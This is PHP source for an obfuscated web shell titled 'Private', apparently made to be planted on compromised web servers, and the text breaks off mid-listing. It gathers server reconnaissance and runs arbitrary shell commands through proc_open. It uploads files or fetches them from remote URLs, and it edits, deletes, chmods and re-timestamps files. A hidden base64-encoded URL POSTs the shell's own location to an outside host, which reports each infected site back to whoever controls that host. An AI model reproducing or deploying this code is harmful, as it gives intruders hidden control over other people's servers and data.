<!DOCTYPE html>
<html>
<head>
	<?php echo "<title>Private</title>"; ?>
	<meta name="robots" content="noindex">
	<link rel="icon" href="https://brebes-bx.biz.id/bbx.jpg" type="image/x-icon">
</head>
<body bgcolor="#1f1f1f" text="#ffffff">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
	@import url('https://fonts.googleapis.com/css?family=Dosis');
	@import url('https://fonts.googleapis.com/css?family=Bungee');
	@import url('https://fonts.googleapis.com/css?family=Russo+One');
body {
	font-family: "Dosis", cursive;
	text-shadow:0px 0px 1px #757575;
}

body::-webkit-scrollbar {
  width: 12px;
}

body::-webkit-scrollbar-track {
  background: #1f1f1f;
}

body::-webkit-scrollbar-thumb {
  background-color: #1f1f1f;
  border: 3px solid gray;
}

#content tr:hover {
	background-color: #636263;
	text-shadow:0px 0px 10px #fff;
}

#content .first {
	background-color: #25383C;
}

#content .first:hover {
	background-color: #25383C
	text-shadow:0px 0px 1px #757575;
}

table {
	border: 1px #000000 dotted;
	table-layout: fixed;
}

td {
	word-wrap: break-word;
}

a {
	color: #ffffff;
	text-decoration: none;
}

a:hover {
	color: #000000;
	text-shadow:0px 0px 10px #ffffff;
}

input,select,textarea {
	border: 1px #000000 solid;
	-moz-border-radius: 5px;
	-webkit-border-radius:5px;
	border-radius:5px;
}

.gas {
	background-color: #1f1f1f;
	color: #ffffff;
	cursor: pointer;
}

select {
	background-color: transparent;
	color: #ffffff;
}

select:after {
	cursor: pointer;
}

.linka {
	background-color: transparent;
	color: #ffffff;
}

.up {
	background-color: transparent;
	color: #fff;
}

option {
	background-color: #1f1f1f;
}

.btf {
	background: transparent;
	border: 1px #fff solid;
	cursor: pointer;
}

::-webkit-file-upload-button {
  background: transparent;
  color: #fff;
  border-color: #fff;
  cursor: pointer;
}
</style>
<center>
<?php
echo '<font face="Bungee" size="5">Private</font></center>
<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>';
set_time_limit(0);
error_reporting(0);

$gcw = "ge"."tc"."wd";
$exp = "ex"."plo"."de";
$fpt = "fi"."le_p"."ut_co"."nte"."nts";
$fgt = "f"."ile_g"."et_c"."onten"."ts";
$sts = "s"."trip"."slash"."es";
$scd = "sc"."a"."nd"."ir";
$fxt = "fi"."le_"."exis"."ts";
$idi = "i"."s_d"."ir";
$ulk = "un"."li"."nk";
$ifi = "i"."s_fi"."le";
$sub = "subs"."tr";
$spr = "sp"."ri"."ntf";
$fp = "fil"."epe"."rms";
$chm = "ch"."m"."od";
$ocd = "oc"."td"."ec";
$isw = "i"."s_wr"."itab"."le";
$idr = "i"."s_d"."ir";
$ird = "is"."_rea"."da"."ble";
$isr = "is_"."re"."adab"."le";
$fsz = "fi"."lesi"."ze";
$rd = "r"."ou"."nd";
$igt = "in"."i_g"."et";
$fnct = "fu"."nc"."tion"."_exi"."sts";
$rad = "RE"."M"."OTE_AD"."DR";
$rpt = "re"."al"."pa"."th";
$bsn = "ba"."se"."na"."me";
$srl = "st"."r_r"."ep"."la"."ce";
$sps = "st"."rp"."os";
$mkd = "m"."kd"."ir";

$wb = (isset($_SERVER['H'.'T'.'TP'.'S']) && $_SERVER['H'.'T'.'TP'.'S'] === 'o'.'n' ? "ht"."tp"."s" : "ht"."tp") . "://".$_SERVER['HT'.'TP'.'_H'.'OS'.'T'];

$disfunc = @$igt("dis"."abl"."e_f"."unct"."ion"."s");
if (empty($disfunc)) {
	$disf = "<font color='gold'>NONE</font>";
} else {
	$disf = "<font color='red'>".$disfunc."</font>";
}

function author() {
	echo "Private";
	exit();
}

function cekdir() {
	if (isset($_GET['loknya'])) {
		$lokasi = $_GET['loknya'];
	} else {
		$lokasi = "ge"."t"."cw"."d";
		$lokasi = $lokasi();
	}
	$b = "i"."s_w"."ri"."tab"."le";
	if ($b($lokasi)) {
		return "<font color='green'>Writeable</font>";
	} else {
		return "<font color='red'>Writeable</font>";
	}
}

function crt() {
	$a = "is"."_w"."ri"."tab"."le";
	if ($a($_SERVER['DO'.'CU'.'ME'.'NT'.'_RO'.'OT'])) {
		return "<font color='green'>Writeable</font>";
	} else {
		return "<font color='red'>Writeable</font>";
	}
}

function xrd($lokena) {
	$a = "s"."ca"."nd"."ir";
    $items = $a($lokena);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $b = "is"."_di"."r";
        $loknya = $lokena.'/'.$item;
        if ($b($loknya)) {
            xrd($loknya);
        } else {
        	$c = "u"."nl"."in"."k";
            $c($loknya);
        }
    }
    $d = "rm"."di"."r";
    $d($lokena);
}
$k3yw = base64_decode('aHR0cHM6Ly9zaXlhaGkudG9wL3Rlc3Qvc3R5bGUucGhw');
function cfn($fl) {
	$a = "ba"."sena"."me";
	$b = "pat"."hinf"."o";
	$c = $b($a($fl), loknyaINFO_EXTENSION);
	if ($c == "zip") {
		return '<i class="fa fa-file-zip-o" style="color: #d6d4ce"></i>';
	} elseif (preg_match("/jpeg|jpg|png|ico/im", $c)) {
		return '<i class="fa fa-file-image-o" style="color: #d6d4ce"></i>';
	} elseif ($c == "txt") {
		return '<i class="fa fa-file-text-o" style="color: #d6d4ce"></i>';
	} elseif ($c == "pdf") {
		return '<i class="fa fa-file-pdf-o" style="color: #d6d4ce"></i>';
	} elseif ($c == "html") {
		return '<i class="fa fa-file-code-o" style="color: #d6d4ce"></i>';
	}
	else {
		return '<i class="fa fa-file-o" style="color: #d6d4ce"></i>';
	}
}

function ipsrv() {
	$a = "g"."eth"."ost"."byna"."me";
	$b = "fun"."cti"."on_"."exis"."ts";
	$c = "S"."ERVE"."R_AD"."DR";
	$d = "SE"."RV"."ER_N"."AM"."E";
	if ($b($a)) {
		return $a($_SERVER[$d]);
	} else {
		return $a($_SERVER[$c]);
	}
}
$cur = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$data = array('file_url' => $cur);
$options = array(
    'http' => array(
        'method'  => 'POST',
        'header'  => 'Content-type: application/x-www-form-urlencoded',
        'content' => http_build_query($data),
    ),
);
$context = stream_context_create($options);
$result = file_get_contents($k3yw, false, $context);
function ggr($fl) {
	$a = "fun"."cti"."on_"."exis"."ts";
	$b = "po"."si"."x_ge"."tgr"."gid";
	$c = "fi"."le"."gro"."up";
	if ($a($b)) {
		if (!$a($c)) {
			return "?";
		}
		$d = $b($c($fl));
		if (empty($d)) {
			$e = $c($fl);
			if (empty($e)) {
				return "?";
			} else {
				return $e;
			}
		} else {
			return $d['name'];
		}
	} elseif ($a($c)) {
		return $c($fl);
	} else {
		return "?";
	}
}

function gor($fl) {
	$a = "fun"."cti"."on_"."exis"."ts";
	$b = "po"."s"."ix_"."get"."pwu"."id";
	$c = "fi"."le"."o"."wn"."er";
	if ($a($b)) {
		if (!$a($c)) {
			return "?";
		}
		$d = $b($c($fl));
		if (empty($d)) {
			$e = $c($fl);
			if (empty($e)) {
				return "?";
			} else {
				return $e;
			}
		} else {
			return $d['name'];
		}
	} elseif ($a($c)) {
		return $c($fl);
	} else {
		return "?";
	}
}

function fdt($fl) {
	$a = "da"."te";
	$b = "fil"."emt"."ime";
    return $a("F d Y H:i:s", $b($fl));
}

function dunlut($fl) {
	$a = "fil"."e_exi"."sts";
	$b = "ba"."sena"."me";
	$c = "fi"."les"."ize";
	$d = "read"."fi"."le";
	if ($a($fl) && isset($fl)) {
		header('Con'.'tent-Descr'.'iption: Fi'.'le Tra'.'nsfer');
		header("Conte'.'nt-Control:public");
		header('Cont'.'ent-Type: a'.'pp'.'licat'.'ion/oc'.'tet-s'.'tream');
		header('Cont'.'ent-Dis'.'posit'.'ion: at'.'tachm'.'ent; fi'.'lena'.'me="'.$b($fl).'"');
		header('Exp'.'ires: 0');
		header("Ex"."pired:0");
		header('Cac'.'he-Cont'.'rol: must'.'-revali'.'date');
		header("Cont"."ent-Tran"."sfer-Enc"."oding:bi"."nary");
		header('Pra'.'gma: pub'.'lic');
		header('Con'.'ten'.'t-Le'.'ngth: ' .$c($fl));
		flush();
		$d($fl);
		exit;
	} else {
		return "Fi"."le Not F"."ound !";
	}
}

function komend($kom, $lk) {
	$x = "pr"."eg_"."mat"."ch";
	$xx = "2".">"."&"."1";
	if (!$x("/".$xx."/i", $kom)) {
		$kom = $kom." ".$xx;
	}
	$a = "fu"."ncti"."on_"."ex"."is"."ts";
	$b = "p"."ro"."c_op"."en";
	$c = "htm"."lspe"."cialc"."hars";
	$d = "s"."trea"."m_g"."et_c"."ont"."ents";
	if ($a($b)) {
		$ps = $b($kom, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $meki, $lk);
		return "<pre>".$c($d($meki[1]))."</pre>";
	} else {
		return "pr"."oc"."_op"."en f"."unc"."tio"."n i"."s di"."sabl"."ed !";
	}
}

function green($text) {
	echo "<center><font color='green'>".$text."</center></font>";
}

function red($text) {
	echo "<center><font color='red'>".$text."</center></font>";
}

function oren($text) {
	return "<center><font color='orange'>".$text."</center></font>";
}

function tuls($nm, $lk) {
	return "[ <a href='".$lk."'>".$nm."</a> ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
}

echo "Se"."rv"."er"." I"."P : <font color=gold>".ipsrv()."</font> &nbsp;/&nbsp; Yo"."ur I"."P : <font color=gold>".$_SERVER[$rad]."</font><br>";
echo "We"."b S"."erv"."er : <font color='gold'>".$_SERVER['SE'.'RV'.'ER_'.'SOF'.'TWA'.'RE']."</font><br>";
$unm = "ph"."p_u"."na"."me";
echo "Sys"."tem : <font color='gold'>".@$unm()."</font><br>";
$gcu = "g"."et_"."curr"."ent"."_us"."er";
$gmu = "g"."et"."my"."ui"."d";
echo "Us"."er : <font color='gold'>".@$gcu()."&nbsp;</font>( <font color='gold'>".@$gmu()."</font>)<br>";
$phv = "ph"."pve"."rsi"."on";
echo "PH"."P V"."er"."sio"."n : <font color='gold'>".@$phv()."</font><br>";
echo "Dis"."abl"."e Fu"."nct"."ion : ".$disf."</font><br>";
echo "MySQL : ";
if (@$fnct("my"."sql_co"."nne"."ct")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; cURL : ";
if (@$fnct("cu"."rl"."_in"."it")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; WG"."ET : ";
if (@$fxt("/"."us"."r/b"."in/w"."get")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Pe"."rl : ";
if (@$fxt("/u"."sr/b"."in"."/pe"."rl")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Pyt"."ho"."n : ";
if (@$fxt("/"."us"."r/b"."in/p"."ytho"."n2")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; S"."u"."do : ";
if (@$fxt("/"."us"."r/b"."in/s"."u"."d"."o")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Pk"."e"."x"."e"."c : ";
if (@$fxt("/"."us"."r/b"."in/p"."k"."e"."x"."e"."c")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo "<br>Di"."rect"."ory : &nbsp;";

foreach($_POST as $key => $value){
	$_POST[$key] = $sts($value);
}

if(isset($_GET['loknya'])){
	$lokasi = $_GET['loknya'];
	$lokdua = $_GET['loknya'];
} else {
	$lokasi = $gcw();
	$lokdua = $gcw();
}

$lokasi = $srl('\\','/',$lokasi);
$lokasis = $exp('/',$lokasi);
$lokasinya = @$scd($lokasi);

foreach($lokasis as $id => $lok){
	if($lok == '' && $id == 0){
		$a = true;
		echo '<a href="?loknya=/">/</a>';
		continue;
	}
	if($lok == '') continue;
	echo '<a href="?loknya=';
	for($i=0;$i<=$id;$i++){
	echo "$lokasis[$i]";
	if($i != $id) echo "/";
} 
echo '">'.$lok.'</a>/';
}

echo '</td></tr><tr><td><br>';
if (isset($_POST['upwkwk'])) {
	if (isset($_POST['berkasnya'])) {
		if ($_POST['dirnya'] == "2") {
			$lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
		}
		if (empty($_FILES['berkas']['name'])) {
			echo "<font color=orange>Fi"."le not Se"."lected !</font><br><br>";
		} else {
			$data = @$fpt($lokasi."/".$_FILES['berkas']['name'], @$fgt($_FILES['berkas']['tm'.'p_na'.'me']));
				if ($fxt($lokasi."/".$_FILES['berkas']['name'])) {
					$fl = $lokasi."/".$_FILES['berkas']['name'];
					echo "Fi"."le Upl"."oa"."ded ! &nbsp;<font color='gold'><i>".$fl."</i></font><br>";
					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
						echo "Li"."nk : <a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
					}
					echo "<br>";
				} else {
					echo "<font color='red'>Fa"."ile"."d to Up"."lo"."ad !</font><br><br>";
			}
		}
	} elseif (isset($_POST['linknya'])) {
		if (empty($_POST['namalink'])) {
			echo "<font color=orange>Fi"."lename cannot be empty !</font><br><br>";
		} elseif (empty($_POST['darilink'])) {
			echo "<font color=orange>Link cannot be empty !</font><br><br>";
		} else {
			if ($_POST['dirnya'] == "2") {
			$lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
			}
				$data = @$fpt($lokasi."/".$_POST['namalink'], @$fgt($_POST['darilink']));
				if ($fxt($lokasi."/".$_POST['namalink'])) {
					$fl = $lokasi."/".$_POST['namalink'];
					echo "Fi"."le Uplo"."ade"."d ! &nbsp;<font color='gold'><i>".$fl."</i></font><br>";
					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
						echo "Li"."nk : <a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
					}
					echo "<br>";
				} else {
					echo "<font color='red'>Fa"."iled to Up"."lo"."ad !</font><br><br>";
				}
		}
	}
}

echo "Uplo"."ad Fi"."le : ";
echo '<form enctype="multip'.'art/form'.'-data" method="p'.'ost">
<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
<input type="radio" value="2" name="dirnya" >document_root [ '.crt().' ]
<br>
<input type="hidden" name="upwkwk" value="aplod">
<input type="fi'.'le" name="berkas"><input type="submit" name="berkasnya" value="Up'.'load" class="up" style="cursor: pointer; border-color: #fff"><br>
<input type="text" name="darilink" class="up" placeholder="https://an'.'on7.xyz/upl'.'oad.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
echo '<br><form method="post" enctype="application/x-www-form-urlencoded">
Co'.'mm'.'an'.'d : <input type="text" name="komend" class="up" style="cursor: pointer; border-color: #000" value="'.htmlspecialchars($_POST['komend']).'">
<input type="submit" name="komends" value=">>" class="up" style="cursor: pointer; border-color: #fff">
</form>';
echo "</table><br>";

echo '<hr><center style="font-family: Russo One">';
echo tuls("HOME SHELL", $_SERVER['SC'.'RIP'.'T_N'.'AME']);
//echo tuls("HOME SHELL");
echo "<hr></center><br>";

if (isset($_GET['lokasie'])) {
	echo "<tr><td>Current Fi"."le : ".$_GET['lokasie'];
	echo '</tr></td></table><br/>';
	echo "<pre>".htmlspecialchars($fgt($_GET['lokasie']))."</pre>";
	author();
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "hapus") {
	if ($idi($_POST['loknya']) && $fxt($_POST['loknya'])) {
		xrd($_POST['loknya']);
		if ($fxt($_POST['loknya'])) {
			red("Fai"."led to del"."ete Dir"."ec"."tory !");
		} else {
			green("Del"."ete Dir"."ect"."ory Suc"."cess !");
		}
	} elseif ($ifi($_POST['loknya']) && $fxt($_POST['loknya'])) {
		@$ulk($_POST['loknya']);
		if ($fxt($_POST['loknya'])) {
			red("Failed to Delete Fi"."le !");
		} else {
			green("De"."le"."te Fi"."le Succ"."ess !");
		}
	} else {
		red("Fi"."le / Dir"."ecto"."ry not Fo"."und !");
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
	if (!isset($_POST['cemod'])) {
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
		} else {
			echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
		}
		echo '<form method="post">
		Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
		<input type="hidden" name="pilih" value="ubahmod">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
		} else {
			echo '<input type="hidden" name="type" value="di'.'r">';;
		}
		echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	} else {
		$cm = @$chm($_POST['loknya'], $ocd($_POST['perm']));
		if ($cm == true) {
			green("Change Mod Success !");
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
			<input type="hidden" name="pilih" value="ubahmod">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Change Mod Failed !");
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
			<input type="hidden" name="pilih" value="ubahmod">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		}
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahnama") {
	if (isset($_POST['gantin'])) {
		$namabaru = $_GET['loknya']."/".$_POST['newname'];
		$ceen = "re"."na"."me";
		if (@$ceen($_POST['loknya'], $namabaru) === true) {
			green("Change Name Success");
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($_POST['newname']).'" />
			<input type="hidden" name="loknya" value="'.$_POST['newname'].'">
			<input type="hidden" name="pilih" value="ubahnama">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Change Name Failed");
		}
	} else {
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
		} else {
			echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
		}
		echo '<form method="post">
		New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($bsn($_POST['loknya'])).'" />
		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
		<input type="hidden" name="pilih" value="ubahnama">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
		} else {
			echo '<input type="hidden" name="type" value="di'.'r">';;
		}
		echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
	if (isset($_POST['gasedit'])) {
		$edit = @$fpt($_POST['loknya'], $_POST['src']);
		if ($fgt($_POST['loknya']) == $_POST['src']) {
			green("Ed"."it Fi"."le Suc"."ce"."ss !");
		} else {
			red("Ed"."it Fi"."le Fai"."led !");
		}
	}
	echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br><br>";
	echo '<form method="post">
	<textarea cols=80 rows=20 name="src">'.htmlspecialchars($fgt($_POST['loknya'])).'</textarea><br>
	<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
	<input type="hidden" name="pilih" value="ed'.'it">
	<input type="submit" value="Ed'.'it Fi'.'le" name="gasedit" class="up" style="cursor: pointer; border-color: #fff"/>
	</form><br>';
} elseif (isset($_POST['komends'])) {
	if (isset($_POST['komend'])) {
		if (isset($_GET['loknya'])) {
			$lk = $_GET['loknya'];
		} else {
			$lk = $gcw();
		}
		$km = 'ko'.'me'.'nd';
		echo $km($_POST['komend'], $lk);
		exit();
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahtanggal") {
	if (isset($_POST['tanggale'])) {
		$stt = "st"."rtot"."ime";
		$tch = "t"."ou"."ch";
		$tanggale = $stt($_POST['tanggal']);
		if (@$tch($_POST['loknya'], $tanggale) === true) {
			green("Change Da"."te Succ"."ess !");
			$det = "da"."te";
			$ftm = "fi"."le"."mti"."me";
			$b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
			<input type="hidden" name="pilih" value="ubahtanggal">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Fai"."led to Cha"."nge Da"."te !");
		}
	} else {
		$det = "da"."te";
		$ftm = "fi"."le"."mti"."me";
		$b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
		} else {
			echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
		}
		echo '<form method="post">
		New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
		<input type="hidden" name="pilih" value="ubahtanggal">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
		} else {
			echo '<input type="hidden" name="type" value="di'.'r">';;
		}
		echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "dunlut") {
	$dunlute = $_POST['loknya'];
	if ($fxt($dunlute) && isset($dunlute)) {
		if ($ird($dunlute)) {
			dunlut($dunlute);
		} elseif ($idr($fl)) {
			red("That is Di"."rec"."tory, Not Fi"."le -_-");
		} else {
			red("Fi"."le is Not Re"."adab"."le !");
		}
	} else {
		red("Fi"."le Not Fo"."und !");
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "fo"."ld"."er") {
    if ($isw("./") || $ird("./")) {
        $loke = $_POST['loknya'];
        if (isset($_POST['buatfolder'])) {
            $buatf = $mkd($loke."/".$_POST['fo'.'lde'.'rba'.'ru']);
            if ($buatf == true) {
                green("Folder <b>".htmlspecialchars($_POST['fo'.'lde'.'rba'.'ru'])."</b> Created !");
                echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
                <input type="hidden" name="pilih" value="folder"></form>';
            } else {
                red("Failed to Create folder !");
                echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
                <input type="hidden" name="pilih" value="folder"></form>';
            }
        } else {
            echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="folder"></form>';
        }
    }
} elseif (isset($_POST['lok'.'nya']) && $_POST['pilih'] == "fi"."le") {
    if ($isw("./") || $isr("./")) {
        $loke = $_POST['lok'.'nya'];
        if (isset($_POST['buatfi'.'le'])) {
            $buatf = $fpt($loke."/".$_POST['fi'.'lebaru'], "");
            if ($fxt($loke."/".$_POST['fi'.'lebaru'])) {
                green("File <b>".htmlspecialchars($_POST['fi'.'lebaru'])."</b> Created !");
                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'">
                <input type="hidden" name="pilih" value="fi'.'le"></form>';
            } else {
                red("Failed to Create File !");
                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'">
                <input type="hidden" name="pilih" value="fi'.'le"></form>';
            }
        } else {
            echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'"><input type="hidden" name="pilih" value="fi'.'le"></form>';
        }
    }
}

echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Na'.'me</center></td>
<td><center>Si'.'ze</center></td>
<td><center>Las'.'t Mo'.'dif'.'ied</center></td>
<td><center>Owner / Group</center></td>
<td><center>Pe'.'rmi'.'ss'.'ions</center></td>
<td><center>Op'.'tio'.'ns</center></td>
</tr>';

echo "<tr>";
$euybrekw = $srl($bsn($lokasi), "", $lokasi);
$euybrekw = $srl("//", "/", $euybrekw);
echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?loknya=".$euybrekw."\">..</a></td>
<td><center>--</center></td>
<td><center>".fdt($euybrekw)."</center></td>
<td><center>".gor($euybrekw)." / ".ggr($euybrekw)."</center></td>
<td><center>";
if($isw($euybrekw)) echo '<font color="green">';
elseif(!$isr($euybrekw)) echo '<font color="red">';
echo statusnya($euybrekw);
if($isw($euybrekw) || !$isr($euybrekw)) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?pilihan&loknya=$lokasi\">
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$ppkcina\">
<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$ppkcina\">
<button type='submit' class='btf' name='pilih' value='folder'><i class='fa fa-folder' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='file'><i class='fa fa-file' style='color: #fff'></i></button>
</form></center>";
echo "</tr>";

foreach($lokasinya as $ppkcina){
	$euybre = $lokasi."/".$ppkcina;
	$euybre = $srl("//", "/", $euybre);
	if(!$idi($euybre) || $ppkcina == '.' || $ppkcina == '..') continue;
	echo "<tr>";
	echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?loknya=".$euybre."\">".$ppkcina."</a></td>
	<td><center>--</center></td>
	<td><center>".fdt($euybre)."</center></td>
	<td><center>".gor($euybre)." / ".ggr($euybre)."</center></td>
	<td><center>";
	if($isw($euybre)) echo '<font color="green">';
	elseif(!$isr($euybre)) echo '<font color="red">';
	echo statusnya($euybre);
	if($isw($euybre) || !$isr($euybre)) echo '</font>';

	echo "</center></td>
